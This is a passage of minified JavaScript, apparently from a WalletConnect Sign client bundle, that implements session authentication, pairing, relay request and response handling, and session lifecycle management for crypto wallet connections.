this.client.core.pairing.pairings.keys.includes(n)&&(this.client.logger.warn("ping() on pairing topic is deprecated and will be removed in the next major release."),await this.client.core.pairing.ping({topic:n}))}),J(this,"emit",async r=>{this.isInitialized(),await this.confirmOnlineStateOrThrow(),await this.isValidEmit(r);const{topic:n,event:i,chainId:s}=r,o=$a().toString(),a=ki();await this.sendRequest({topic:n,method:"wc_sessionEvent",params:{event:i,chainId:s},throwOnFailedPublish:!0,relayRpcId:o,clientRpcId:a})}),J(this,"disconnect",async r=>{this.isInitialized(),await this.confirmOnlineStateOrThrow(),await this.isValidDisconnect(r);const{topic:n}=r;if(this.client.session.keys.includes(n))await this.sendRequest({topic:n,method:"wc_sessionDelete",params:it("USER_DISCONNECTED"),throwOnFailedPublish:!0}),await this.deleteSession({topic:n,emitEvent:!1});else if(this.client.core.pairing.pairings.keys.includes(n))await this.client.core.pairing.disconnect({topic:n});else{const{message:i}=ee("MISMATCHED_TOPIC",`Session or pairing topic not found: ${n}`);throw new Error(i)}}),J(this,"find",r=>(this.isInitialized(),this.client.session.getAll().filter(n=>k$(n,r)))),J(this,"getPendingSessionRequests",()=>this.client.pendingRequest.getAll()),J(this,"authenticate",async(r,n)=>{var i;this.isInitialized(),this.isValidAuthenticate(r);const s=n&&this.client.core.linkModeSupportedApps.includes(n)&&((i=this.client.metadata.redirect)==null?void 0:i.linkMode),o=s?mt.link_mode:mt.relay;o===mt.relay&&await this.confirmOnlineStateOrThrow();const{chains:a,statement:c="",uri:l,domain:u,nonce:h,type:d,exp:f,nbf:g,methods:p=[],expiry:w}=r,m=[...r.resources||[]],{topic:b,uri:v}=await this.client.core.pairing.create({methods:["wc_sessionAuthenticate"],transportType:o});this.client.logger.info({message:"Generated new pairing",pairing:{topic:b,uri:v}});const x=await this.client.core.crypto.generateKeyPair(),I=_0(x);if(await Promise.all([this.client.auth.authKeys.set(D0,{responseTopic:I,publicKey:x}),this.client.auth.pairingTopics.set(I,{topic:I,pairingTopic:b})]),await this.client.core.relayer.subscribe(I,{transportType:o}),this.client.logger.info(`sending request to new pairing topic: ${b}`),p.length>0){const{namespace:R}=Hl(a[0]);let L=M_(R,"request",p);O0(m)&&(L=z_(L,m.pop())),m.push(L)}const C=w&&w>zt.wc_sessionAuthenticate.req.ttl?w:zt.wc_sessionAuthenticate.req.ttl,N={authPayload:{type:d??"caip122",chains:a,statement:c,aud:l,domain:u,version:"1",nonce:h,iat:new Date().toISOString(),exp:f,nbf:g,resources:m},requester:{publicKey:x,metadata:this.client.metadata},expiryTimestamp:Dt(C)},S={eip155:{chains:a,methods:[...new Set(["personal_sign",...p])],events:["chainChanged","accountsChanged"]}},P={requiredNamespaces:{},optionalNamespaces:S,relays:[{protocol:"irn"}],pairingTopic:b,proposer:{publicKey:x,metadata:this.client.metadata},expiryTimestamp:Dt(zt.wc_sessionPropose.req.ttl),id:ki()},{done:T,resolve:D,reject:z}=ma(C,"Request expired"),V=ki(),O=Xe("session_connect",P.id),y=Xe("session_request",V),E=async({error:R,session:L})=>{this.events.off(y,k),R?z(R):L&&D({session:L})},k=async R=>{var L,q,W;if(await this.deletePendingAuthRequest(V,{message:"fulfilled",code:0}),R.error){const be=it("WC_METHOD_UNSUPPORTED","wc_sessionAuthenticate");return R.error.code===be.code?void 0:(this.events.off(O,E),z(R.error.message))}await this.deleteProposal(P.id),this.events.off(O,E);const{cacaos:Z,responder:G}=R.result,ne=[],de=[];for(const be of Z){await h3({cacao:be,projectId:this.client.core.projectId})||(this.client.logger.error(be,"Signature verification failed"),z(it("SESSION_SETTLEMENT_FAILED","Signature verification failed")));const{p:ke}=be,Me=O0(ke.resources),Ue=[Qm(ke.iss)],Le=Y0(ke.iss);if(Me){const wt=d3(Me),bn=f3(Me);ne.push(...wt),Ue.push(...bn)}for(const wt of Ue)de.push(`${wt}:${Le}`)}const Se=await this.client.core.crypto.generateSharedKey(x,G.publicKey);let Ne;ne.length>0&&(Ne={topic:Se,acknowledged:!0,self:{publicKey:x,metadata:this.client.metadata},peer:G,controller:G.publicKey,expiry:Dt(Gc),requiredNamespaces:{},optionalNamespaces:{},relay:{protocol:"irn"},pairingTopic:b,namespaces:D3([...new Set(ne)],[...new Set(de)]),transportType:o},await this.client.core.relayer.subscribe(Se,{transportType:o}),await this.client.session.set(Se,Ne),b&&await this.client.core.pairing.updateMetadata({topic:b,metadata:G.metadata}),Ne=this.client.session.get(Se)),(L=this.client.metadata.redirect)!=null&&L.linkMode&&(q=G.metadata.redirect)!=null&&q.linkMode&&(W=G.metadata.redirect)!=null&&W.universal&&n&&(this.client.core.addLinkModeSupportedApp(G.metadata.redirect.universal),this.client.session.update(Se,{transportType:mt.link_mode})),D({auths:Z,session:Ne})};this.events.once(O,E),this.events.once(y,k);let _;try{if(s){const R=$o("wc_sessionAuthenticate",N,V);this.client.core.history.set(b,R);const L=await this.client.core.crypto.encode("",R,{type:Wf,encoding:fo});_=vp(n,b,L)}else await Promise.all([this.sendRequest({topic:b,method:"wc_sessionAuthenticate",params:N,expiry:r.expiry,throwOnFailedPublish:!0,clientRpcId:V}),this.sendRequest({topic:b,method:"wc_sessionPropose",params:P,expiry:zt.wc_sessionPropose.req.ttl,throwOnFailedPublish:!0,clientRpcId:P.id})])}catch(R){throw this.events.off(O,E),this.events.off(y,k),R}return await this.setProposal(P.id,P),await this.setAuthRequest(V,{request:br(lt({},N),{verifyContext:{}}),pairingTopic:b,transportType:o}),{uri:_??v,response:T}}),J(this,"approveSessionAuthenticate",async r=>{const{id:n,auths:i}=r,s=this.client.core.eventClient.createEvent({properties:{topic:n.toString(),trace:[Xo.authenticated_session_approve_started]}});try{this.isInitialized()}catch(w){throw s.setError(Nh.no_internet_connection),w}const o=this.getPendingAuthRequest(n);if(!o)throw s.setError(Nh.authenticated_session_pending_request_not_found),new Error(`Could not find pending auth request with id ${n}`);const a=o.transportType||mt.relay;a===mt.relay&&await this.confirmOnlineStateOrThrow();const c=o.requester.publicKey,l=await this.client.core.crypto.generateKeyPair(),u=_0(c),h={type:Ls,receiverPublicKey:c,senderPublicKey:l},d=[],f=[];for(const w of i){if(!await h3({cacao:w,projectId:this.client.core.projectId})){s.setError(Nh.invalid_cacao);const I=it("SESSION_SETTLEMENT_FAILED","Signature verification failed");throw await this.sendError({id:n,topic:u,error:I,encodeOpts:h}),new Error(I.message)}s.addTrace(Xo.cacaos_verified);const{p:m}=w,b=O0(m.resources),v=[Qm(m.iss)],x=Y0(m.iss);if(b){const I=d3(b),C=f3(b);d.push(...I),v.push(...C)}for(const I of v)f.push(`${I}:${x}`)}const g=await this.client.core.crypto.generateSharedKey(l,c);s.addTrace(Xo.create_authenticated_session_topic);let p;if((d==null?void 0:d.length)>0){p={topic:g,acknowledged:!0,self:{publicKey:l,metadata:this.client.metadata},peer:{publicKey:c,metadata:o.requester.metadata},controller:c,expiry:Dt(Gc),authentication:i,requiredNamespaces:{},optionalNamespaces:{},relay:{protocol:"irn"},pairingTopic:o.pairingTopic,namespaces:D3([...new Set(d)],[...new Set(f)]),transportType:a},s.addTrace(Xo.subscribing_authenticated_session_topic);try{await this.client.core.relayer.subscribe(g,{transportType:a})}catch(w){throw s.setError(Nh.subscribe_authenticated_session_topic_failure),w}s.addTrace(Xo.subscribe_authenticated_session_topic_success),await this.client.session.set(g,p),s.addTrace(Xo.store_authenticated_session),await this.client.core.pairing.updateMetadata({topic:o.pairingTopic,metadata:o.requester.metadata})}s.addTrace(Xo.publishing_authenticated_session_approve);try{await this.sendResult({topic:u,id:n,result:{cacaos:i,responder:{publicKey:l,metadata:this.client.metadata}},encodeOpts:h,throwOnFailedPublish:!0,appLink:this.getAppLinkIfEnabled(o.requester.metadata,a)})}catch(w){throw s.setError(Nh.authenticated_session_approve_publish_failure),w}return await this.client.auth.requests.delete(n,{message:"fulfilled",code:0}),await this.client.core.pairing.activate({topic:o.pairingTopic}),this.client.core.eventClient.deleteEvent({eventId:s.eventId}),{session:p}}),J(this,"rejectSessionAuthenticate",async r=>{this.isInitialized();const{id:n,reason:i}=r,s=this.getPendingAuthRequest(n);if(!s)throw new Error(`Could not find pending auth request with id ${n}`);s.transportType===mt.relay&&await this.confirmOnlineStateOrThrow();const o=s.requester.publicKey,a=await this.client.core.crypto.generateKeyPair(),c=_0(o),l={type:Ls,receiverPublicKey:o,senderPublicKey:a};await this.sendError({id:n,topic:c,error:i,encodeOpts:l,rpcOpts:zt.wc_sessionAuthenticate.reject,appLink:this.getAppLinkIfEnabled(s.requester.metadata,s.transportType)}),await this.client.auth.requests.delete(n,{message:"rejected",code:0}),await this.client.proposal.delete(n,it("USER_DISCONNECTED"))}),J(this,"formatAuthMessage",r=>{this.isInitialized();const{request:n,iss:i}=r;return iC(n,i)}),J(this,"processRelayMessageCache",()=>{setTimeout(async()=>{if(this.relayMessageCache.length!==0)for(;this.relayMessageCache.length>0;)try{const r=this.relayMessageCache.shift();r&&await this.onRelayMessage(r)}catch(r){this.client.logger.error(r)}},50)}),J(this,"cleanupDuplicatePairings",async r=>{if(r.pairingTopic)try{const n=this.client.core.pairing.pairings.get(r.pairingTopic),i=this.client.core.pairing.pairings.getAll().filter(s=>{var o,a;return((o=s.peerMetadata)==null?void 0:o.url)&&((a=s.peerMetadata)==null?void 0:a.url)===r.peer.metadata.url&&s.topic&&s.topic!==n.topic});if(i.length===0)return;this.client.logger.info(`Cleaning up ${i.length} duplicate pairing(s)`),await Promise.all(i.map(s=>this.client.core.pairing.disconnect({topic:s.topic}))),this.client.logger.info("Duplicate pairings clean up finished")}catch(n){this.client.logger.error(n)}}),J(this,"deleteSession",async r=>{var n;const{topic:i,expirerHasDeleted:s=!1,emitEvent:o=!0,id:a=0}=r,{self:c}=this.client.session.get(i);await this.client.core.relayer.unsubscribe(i),await this.client.session.delete(i,it("USER_DISCONNECTED")),this.addToRecentlyDeleted(i,"session"),this.client.core.crypto.keychain.has(c.publicKey)&&await this.client.core.crypto.deleteKeyPair(c.publicKey),this.client.core.crypto.keychain.has(i)&&await this.client.core.crypto.deleteSymKey(i),s||this.client.core.expirer.del(i),this.client.core.storage.removeItem(_5).catch(l=>this.client.logger.warn(l)),this.getPendingSessionRequests().forEach(l=>{l.topic===i&&this.deletePendingSessionRequest(l.id,it("USER_DISCONNECTED"))}),i===((n=this.sessionRequestQueue.queue[0])==null?void 0:n.topic)&&(this.sessionRequestQueue.state=vi.idle),o&&this.client.events.emit("session_delete",{id:a,topic:i})}),J(this,"deleteProposal",async(r,n)=>{if(n)try{const i=this.client.proposal.get(r),s=this.client.core.eventClient.getEvent({topic:i.pairingTopic});s==null||s.setError(Yo.proposal_expired)}catch{}await Promise.all([this.client.proposal.delete(r,it("USER_DISCONNECTED")),n?Promise.resolve():this.client.core.expirer.del(r)]),this.addToRecentlyDeleted(r,"proposal")}),J(this,"deletePendingSessionRequest",async(r,n,i=!1)=>{await Promise.all([this.client.pendingRequest.delete(r,n),i?Promise.resolve():this.client.core.expirer.del(r)]),this.addToRecentlyDeleted(r,"request"),this.sessionRequestQueue.queue=this.sessionRequestQueue.queue.filter(s=>s.id!==r),i&&(this.sessionRequestQueue.state=vi.idle,this.client.events.emit("session_request_expire",{id:r}))}),J(this,"deletePendingAuthRequest",async(r,n,i=!1)=>{await Promise.all([this.client.auth.requests.delete(r,n),i?Promise.resolve():this.client.core.expirer.del(r)])}),J(this,"setExpiry",async(r,n)=>{this.client.session.keys.includes(r)&&(this.client.core.expirer.set(r,n),await this.client.session.update(r,{expiry:n}))}),J(this,"setProposal",async(r,n)=>{this.client.core.expirer.set(r,Dt(zt.wc_sessionPropose.req.ttl)),await this.client.proposal.set(r,n)}),J(this,"setAuthRequest",async(r,n)=>{const{request:i,pairingTopic:s,transportType:o=mt.relay}=n;this.client.core.expirer.set(r,i.expiryTimestamp),await this.client.auth.requests.set(r,{authPayload:i.authPayload,requester:i.requester,expiryTimestamp:i.expiryTimestamp,id:r,pairingTopic:s,verifyContext:i.verifyContext,transportType:o})}),J(this,"setPendingSessionRequest",async r=>{const{id:n,topic:i,params:s,verifyContext:o}=r,a=s.request.expiryTimestamp||Dt(zt.wc_sessionRequest.req.ttl);this.client.core.expirer.set(n,a),await this.client.pendingRequest.set(n,{id:n,topic:i,params:s,verifyContext:o})}),J(this,"sendRequest",async r=>{const{topic:n,method:i,params:s,expiry:o,relayRpcId:a,clientRpcId:c,throwOnFailedPublish:l,appLink:u,tvf:h}=r,d=$o(i,s,c);let f;const g=!!u;try{const m=g?fo:ui;f=await this.client.core.crypto.encode(n,d,{encoding:m})}catch(m){throw await this.cleanup(),this.client.logger.error(`sendRequest() -> core.crypto.encode() for topic ${n} failed`),m}let p;if($M.includes(i)){const m=Fi(JSON.stringify(d)),b=Fi(f);p=await this.client.core.verify.register({id:b,decryptedId:m})}const w=zt[i].req;if(w.attestation=p,o&&(w.ttl=o),a&&(w.id=a),this.client.core.history.set(n,d),g){const m=vp(u,n,f);await global.Linking.openURL(m,this.client.name)}else{const m=zt[i].req;o&&(m.ttl=o),a&&(m.id=a),m.tvf=br(lt({},h),{correlationId:d.id}),l?(m.internal=br(lt({},m.internal),{throwOnFailedPublish:!0}),await this.client.core.relayer.publish(n,f,m)):this.client.core.relayer.publish(n,f,m).catch(b=>this.client.logger.error(b))}return d.id}),J(this,"sendResult",async r=>{const{id:n,topic:i,result:s,throwOnFailedPublish:o,encodeOpts:a,appLink:c}=r,l=Jg(n,s);let u;const h=c&&typeof(global==null?void 0:global.Linking)<"u";try{const g=h?fo:ui;u=await this.client.core.crypto.encode(i,l,br(lt({},a||{}),{encoding:g}))}catch(g){throw await this.cleanup(),this.client.logger.error(`sendResult() -> core.crypto.encode() for topic ${i} failed`),g}let d,f;try{d=await this.client.core.history.get(i,n);const g=d.request;try{this.shouldSetTVF(g.method,g.params)&&(f=this.getTVFParams(n,g.params,s))}catch(p){this.client.logger.warn("sendResult() -> getTVFParams() failed",p)}}catch(g){throw this.client.logger.error(`sendResult() -> history.get(${i}, ${n}) failed`),g}if(h){const g=vp(c,i,u);await global.Linking.openURL(g,this.client.name)}else{const g=d.request.method,p=zt[g].res;p.tvf=br(lt({},f),{correlationId:n}),o?(p.internal=br(lt({},p.internal),{throwOnFailedPublish:!0}),await this.client.core.relayer.publish(i,u,p)):this.client.core.relayer.publish(i,u,p).catch(w=>this.client.logger.error(w))}await this.client.core.history.resolve(l)}),J(this,"sendError",async r=>{const{id:n,topic:i,error:s,encodeOpts:o,rpcOpts:a,appLink:c}=r,l=Qg(n,s);let u;const h=c&&typeof(global==null?void 0:global.Linking)<"u";try{const f=h?fo:ui;u=await this.client.core.crypto.encode(i,l,br(lt({},o||{}),{encoding:f}))}catch(f){throw await this.cleanup(),this.client.logger.error(`sendError() -> core.crypto.encode() for topic ${i} failed`),f}let d;try{d=await this.client.core.history.get(i,n)}catch(f){throw this.client.logger.error(`sendError() -> history.get(${i}, ${n}) failed`),f}if(h){const f=vp(c,i,u);await global.Linking.openURL(f,this.client.name)}else{const f=d.request.method,g=a||zt[f].res;this.client.core.relayer.publish(i,u,g)}await this.client.core.history.resolve(l)}),J(this,"cleanup",async()=>{const r=[],n=[];this.client.session.getAll().forEach(i=>{let s=!1;co(i.expiry)&&(s=!0),this.client.core.crypto.keychain.has(i.topic)||(s=!0),s&&r.push(i.topic)}),this.client.proposal.getAll().forEach(i=>{co(i.expiryTimestamp)&&n.push(i.id)}),await Promise.all([...r.map(i=>this.deleteSession({topic:i})),...n.map(i=>this.deleteProposal(i))])}),J(this,"onProviderMessageEvent",async r=>{!this.initialized||this.relayMessageCache.length>0?this.relayMessageCache.push(r):await this.onRelayMessage(r)}),J(this,"onRelayEventRequest",async r=>{this.requestQueue.queue.push(r),await this.processRequestsQueue()}),J(this,"processRequestsQueue",async()=>{if(this.requestQueue.state===vi.active){this.client.logger.info("Request queue already active, skipping...");return}for(this.client.logger.info(`Request queue starting with ${this.requestQueue.queue.length} requests`);this.requestQueue.queue.length>0;){this.requestQueue.state=vi.active;const r=this.requestQueue.queue.shift();if(r)try{await this.processRequest(r)}catch(n){this.client.logger.warn(n)}}this.requestQueue.state=vi.idle}),J(this,"processRequest",async r=>{const{topic:n,payload:i,attestation:s,transportType:o,encryptedId:a}=r,c=i.method;if(!this.shouldIgnorePairingRequest({topic:n,requestMethod:c}))switch(c){case"wc_sessionPropose":return await this.onSessionProposeRequest({topic:n,payload:i,attestation:s,encryptedId:a});case"wc_sessionSettle":return await this.onSessionSettleRequest(n,i);case"wc_sessionUpdate":return await this.onSessionUpdateRequest(n,i);case"wc_sessionExtend":return await this.onSessionExtendRequest(n,i);case"wc_sessionPing":return await this.onSessionPingRequest(n,i);case"wc_sessionDelete":return await this.onSessionDeleteRequest(n,i);case"wc_sessionRequest":return await this.onSessionRequest({topic:n,payload:i,attestation:s,encryptedId:a,transportType:o});case"wc_sessionEvent":return await this.onSessionEventRequest(n,i);case"wc_sessionAuthenticate":return await this.onSessionAuthenticateRequest({topic:n,payload:i,attestation:s,encryptedId:a,transportType:o});default:return this.client.logger.info(`Unsupported request method ${c}`)}}),J(this,"onRelayEventResponse",async r=>{const{topic:n,payload:i,transportType:s}=r,o=(await this.client.core.history.get(n,i.id)).request.method;switch(o){case"wc_sessionPropose":return this.onSessionProposeResponse(n,i,s);case"wc_sessionSettle":return this.onSessionSettleResponse(n,i);case"wc_sessionUpdate":return this.onSessionUpdateResponse(n,i);case"wc_sessionExtend":return this.onSessionExtendResponse(n,i);case"wc_sessionPing":return this.onSessionPingResponse(n,i);case"wc_sessionRequest":return this.onSessionRequestResponse(n,i);case"wc_sessionAuthenticate":return this.onSessionAuthenticateResponse(n,i);default:return this.client.logger.info(`Unsupported response method ${o}`)}}),J(this,"onRelayEventUnknownPayload",r=>{const{topic:n}=r,{message:i}=ee("MISSING_OR_INVALID",`Decoded payload on topic ${n} is not identifiable as a JSON-RPC request or a response.`);throw new Error(i)}),J(this,"shouldIgnorePairingRequest",r=>{const{topic:n,requestMethod:i}=r,s=this.expectedPairingMethodMap.get(n);return!s||s.includes(i)?!1:!!(s.includes("wc_sessionAuthenticate")&&this.client.events.listenerCount("session_authenticate")>0)}),J(this,"onSessionProposeRequest",async r=>{const{topic:n,payload:i,attestation:s,encryptedId:o}=r,{params:a,id:c}=i;try{const l=this.client.core.eventClient.getEvent({topic:n});this.client.events.listenerCount("session_proposal")===0&&(console.warn("No listener for session_proposal event"),l==null||l.setError(ds.proposal_listener_not_found)),this.isValidConnect(lt({},i.params));const u=a.expiryTimestamp||Dt(zt.wc_sessionPropose.req.ttl),h=lt({id:c,pairingTopic:n,expiryTimestamp:u},a);await this.setProposal(c,h);const d=await this.getVerifyContext({attestationId:s,hash:Fi(JSON.stringify(i)),encryptedId:o,metadata:h.proposer.metadata});l==null||l.addTrace(Ni.emit_session_proposal),this.client.events.emit("session_proposal",{id:c,params:h,verifyContext:d})}catch(l){await this.sendError({id:c,topic:n,error:l,rpcOpts:zt.wc_sessionPropose.autoReject}),this.client.logger.error(l)}}),J(this,"onSessionProposeResponse",async(r,n,i)=>{const{id:s}=n;if(Oi(n)){const{result:o}=n;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",result:o});const a=this.client.proposal.get(s);this.client.logger.trace({type:"method",method:"onSessionProposeResponse",proposal:a});const c=a.proposer.publicKey;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",selfPublicKey:c});const l=o.responderPublicKey;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",peerPublicKey:l});const u=await this.client.core.crypto.generateSharedKey(c,l);this.pendingSessions.set(s,{sessionTopic:u,pairingTopic:r,proposalId:s,publicKey:c});const h=await this.client.core.relayer.subscribe(u,{transportType:i});this.client.logger.trace({type:"method",method:"onSessionProposeResponse",subscriptionId:h}),await this.client.core.pairing.activate({topic:r})}else if(Mn(n)){await this.client.proposal.delete(s,it("USER_DISCONNECTED"));const o=Xe("session_connect",s);if(this.events.listenerCount(o)===0)throw new Error(`emitting ${o} without any listeners, 954`);this.events.emit(o,{error:n.error})}}),J(this,"onSessionSettleRequest",async(r,n)=>{const{id:i,params:s}=n;try{this.isValidSessionSettleRequest(s);const{relay:o,controller:a,expiry:c,namespaces:l,sessionProperties:u,scopedProperties:h,sessionConfig:d}=n.params,f=[...this.pendingSessions.values()].find(w=>w.sessionTopic===r);if(!f)return this.client.logger.error(`Pending session not found for topic ${r}`);const g=this.client.proposal.get(f.proposalId),p=br(lt(lt(lt({topic:r,relay:o,expiry:c,namespaces:l,acknowledged:!0,pairingTopic:f.pairingTopic,requiredNamespaces:g.requiredNamespaces,optionalNamespaces:g.optionalNamespaces,controller:a.publicKey,self:{publicKey:f.publicKey,metadata:this.client.metadata},peer:{publicKey:a.publicKey,metadata:a.metadata}},u&&{sessionProperties:u}),h&&{scopedProperties:h}),d&&{sessionConfig:d}),{transportType:mt.relay});await this.client.session.set(p.topic,p),await this.setExpiry(p.topic,p.expiry),await this.client.core.pairing.updateMetadata({topic:f.pairingTopic,metadata:p.peer.metadata}),this.client.events.emit("session_connect",{session:p}),this.events.emit(Xe("session_connect",f.proposalId),{session:p}),this.pendingSessions.delete(f.proposalId),this.deleteProposal(f.proposalId,!1),this.cleanupDuplicatePairings(p),await this.sendResult({id:n.id,topic:r,result:!0,throwOnFailedPublish:!0})}catch(o){await this.sendError({id:i,topic:r,error:o}),this.client.logger.error(o)}}),J(this,"onSessionSettleResponse",async(r,n)=>{const{id:i}=n;Oi(n)?(await this.client.session.update(r,{acknowledged:!0}),this.events.emit(Xe("session_approve",i),{})):Mn(n)&&(await this.client.session.delete(r,it("USER_DISCONNECTED")),this.events.emit(Xe("session_approve",i),{error:n.error}))}),J(this,"onSessionUpdateRequest",async(r,n)=>{const{params:i,id:s}=n;try{const o=`${r}_session_update`,a=Ih.get(o);if(a&&this.isRequestOutOfSync(a,s)){this.client.logger.warn(`Discarding out of sync request - ${s}`),this.sendError({id:s,topic:r,error:it("INVALID_UPDATE_REQUEST")});return}this.isValidUpdate(lt({topic:r},i));try{Ih.set(o,s),await this.client.session.update(r,{namespaces:i.namespaces}),await this.sendResult({id:s,topic:r,result:!0,throwOnFailedPublish:!0})}catch(c){throw Ih.delete(o),c}this.client.events.emit("session_update",{id:s,topic:r,params:i})}catch(o){await this.sendError({id:s,topic:r,error:o}),this.client.logger.error(o)}}),J(this,"isRequestOutOfSync",(r,n)=>n.toString().slice(0,-3)<r.toString().slice(0,-3)),J(this,"onSessionUpdateResponse",(r,n)=>{const{id:i}=n,s=Xe("session_update",i);if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners`);Oi(n)?this.events.emit(Xe("session_update",i),{}):Mn(n)&&this.events.emit(Xe("session_update",i),{error:n.error})}),J(this,"onSessionExtendRequest",async(r,n)=>{const{id:i}=n;try{this.isValidExtend({topic:r}),await this.setExpiry(r,Dt(Gc)),await this.sendResult({id:i,topic:r,result:!0,throwOnFailedPublish:!0}),this.client.events.emit("session_extend",{id:i,topic:r})}catch(s){await this.sendError({id:i,topic:r,error:s}),this.client.logger.error(s)}}),J(this,"onSessionExtendResponse",(r,n)=>{const{id:i}=n,s=Xe("session_extend",i);if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners`);Oi(n)?this.events.emit(Xe("session_extend",i),{}):Mn(n)&&this.events.emit(Xe("session_extend",i),{error:n.error})}),J(this,"onSessionPingRequest",async(r,n)=>{const{id:i}=n;try{this.isValidPing({topic:r}),await this.sendResult({id:i,topic:r,result:!0,throwOnFailedPublish:!0}),this.client.events.emit("session_ping",{id:i,topic:r})}catch(s){await this.sendError({id:i,topic:r,error:s}),this.client.logger.error(s)}}),J(this,"onSessionPingResponse",(r,n)=>{const{id:i}=n,s=Xe("session_ping",i);setTimeout(()=>{if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners 2176`);Oi(n)?this.events.emit(Xe("session_ping",i),{}):Mn(n)&&this.events.emit(Xe("session_ping",i),{error:n.error})},500)}),J(this,"onSessionDeleteRequest",async(r,n)=>{const{id:i}=n;try{this.isValidDisconnect({topic:r,reason:n.params}),Promise.all([new Promise(s=>{this.client.core.relayer.once(Kt.publish,async()=>{s(await this.deleteSession({topic:r,id:i}))})}),this.sendResult({id:i,topic:r,result:!0,throwOnFailedPublish:!0}),this.cleanupPendingSentRequestsForTopic({topic:r,error:it("USER_DISCONNECTED")})]).catch(s=>this.client.logger.error(s))}catch(s){this.client.logger.error(s)}}),J(this,"onSessionRequest",async r=>{var n,i,s;const{topic:o,payload:a,attestation:c,encryptedId:l,transportType:u}=r,{id:h,params:d}=a;try{await this.isValidRequest(lt({topic:o},d));const f=this.client.session.get(o),g=await this.getVerifyContext({attestationId:c,hash:Fi(JSON.stringify($o("wc_sessionRequest",d,h))),encryptedId:l,metadata:f.peer.metadata,transportType:u}),p={id:h,topic:o,params:d,verifyContext:g};await this.setPendingSessionRequest(p),u===mt.link_mode&&(n=f.peer.metadata.redirect)!=null&&n.universal&&this.client.core.addLinkModeSupportedApp((i=f.peer.metadata.redirect)==null?void 0:i.universal),(s=this.client.signConfig)!=null&&s.disableRequestQueue?this.emitSessionRequest(p):(this.addSessionRequestToSessionRequestQueue(p),this.processSessionRequestQueue())}catch(f){await this.sendError({id:h,topic:o,error:f}),this.client.logger.error(f)}}),J(this,"onSessionRequestResponse",(r,n)=>{const{id:i}=n,s=Xe("session_request",i);if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners`);Oi(n)?this.events.emit(Xe("session_request",i),{result:n.result}):Mn(n)&&this.events.emit(Xe("session_request",i),{error:n.error})}),J(this,"onSessionEventRequest",async(r,n)=>{const{id:i,params:s}=n;try{const o=`${r}_session_event_${s.event.name}`,a=Ih.get(o);if(a&&this.isRequestOutOfSync(a,i)){this.client.logger.info(`Discarding out of sync request - ${i}`);return}this.isValidEmit(lt({topic:r},s)),this.client.events.emit("session_event",{id:i,topic:r,params:s}),Ih.set(o,i)}catch(o){await this.sendError({id:i,topic:r,error:o}),this.client.logger.error(o)}}),J(this,"onSessionAuthenticateResponse",(r,n)=>{const{id:i}=n;this.client.logger.trace({type:"method",method:"onSessionAuthenticateResponse",topic:r,payload:n}),Oi(n)?this.events.emit(Xe("session_request",i),{result:n.result}):Mn(n)&&this.events.emit(Xe("session_request",i),{error:n.error})}),J(this,"onSessionAuthenticateRequest",async r=>{var n;const{topic:i,payload:s,attestation:o,encryptedId:a,transportType:c}=r;try{const{requester:l,authPayload:u,expiryTimestamp:h}=s.params,d=await this.getVerifyContext({attestationId:o,hash:Fi(JSON.stringify(s)),encryptedId:a,metadata:l.metadata,transportType:c}),f={requester:l,pairingTopic:i,id:s.id,authPayload:u,verifyContext:d,expiryTimestamp:h};await this.setAuthRequest(s.id,{request:f,pairingTopic:i,transportType:c}),c===mt.link_mode&&(n=l.metadata.redirect)!=null&&n.universal&&this.client.core.addLinkModeSupportedApp(l.metadata.redirect.universal),this.client.events.emit("session_authenticate",{topic:i,params:s.params,id:s.id,verifyContext:d})}catch(l){this.client.logger.error(l);const u=s.params.requester.publicKey,h=await this.client.core.crypto.generateKeyPair(),d=this.getAppLinkIfEnabled(s.params.requester.metadata,c),f={type:Ls,receiverPublicKey:u,senderPublicKey:h};await this.sendError({id:s.id,topic:i,error:l,encodeOpts:f,rpcOpts:zt.wc_sessionAuthenticate.autoReject,appLink:d})}}),J(this,"addSessionRequestToSessionRequestQueue",r=>{this.sessionRequestQueue.queue.push(r)}),J(this,"cleanupAfterResponse",r=>{this.deletePendingSessionRequest(r.response.id,{message:"fulfilled",code:0}),setTimeout(()=>{this.sessionRequestQueue.state=vi.idle,this.processSessionRequestQueue()},X.toMiliseconds(this.requestQueueDelay))}),J(this,"cleanupPendingSentRequestsForTopic",({topic:r,error:n})=>{const i=this.client.core.history.pending;i.length>0&&i.filter(s=>s.topic===r&&s.request.method==="wc_sessionRequest").forEach(s=>{const o=s.request.id,a=Xe("session_request",o);if(this.events.listenerCount(a)===0)throw new Error(`emitting ${a} without any listeners`);this.events.emit(Xe("session_request",s.request.id),{error:n})})}),J(this,"processSessionRequestQueue",()=>{if(this.sessionRequestQueue.state===vi.active){this.client.logger.info("session request queue is already active.");return}const r=this.sessionRequestQueue.queue[0];if(!r){this.client.logger.info("session request queue is empty.");return}try{this.sessionRequestQueue.state=vi.active,this.emitSessionRequest(r)}catch(n){this.client.logger.error(n)}}),J(this,"emitSessionRequest",r=>{this.client.events.emit("session_request",r)}),J(this,"onPairingCreated",r=>{if(r.methods&&this.expectedPairingMethodMap.set(r.topic,r.methods),r.active)return;const n=this.client.proposal.getAll().find(i=>i.pairingTopic===r.topic);n&&this.onSessionProposeRequest({topic:r.topic,payload:$o("wc_sessionPropose",br(lt({},n),{requiredNamespaces:n.requiredNamespaces,optionalNamespaces:n.optionalNamespaces,relays:n.relays,proposer:n.proposer,sessionProperties:n.sessionProperties,scopedProperties:n.scopedProperties}),n.id)})}),J(this,"isValidConnect",async r=>{if(!Fr(r)){const{message:l}=ee("MISSING_OR_INVALID",`connect() params: ${JSON.stringify(r)}`);throw new Error(l)}const{pairingTopic:n,requiredNamespaces:i,optionalNamespaces:s,sessionProperties:o,scopedProperties:a,relays:c}=r;if(ir(n)||await this.isValidPairingTopic(n),!z$(c)){const{message:l}=ee("MISSING_OR_INVALID",`connect() relays: ${c}`);throw new Error(l)}if(!ir(i)&&Md(i)!==0&&this.validateNamespaces(i,"requiredNamespaces"),!ir(s)&&Md(s)!==0&&this.validateNamespaces(s,"optionalNamespaces"),ir(o)||this.validateSessionProps(o,"sessionProperties"),!ir(a)){this.validateSessionProps(a,"scopedProperties");const l=Object.keys(i||{}).concat(Object.keys(s||{}));if(!Object.keys(a).every(u=>l.includes(u)))throw 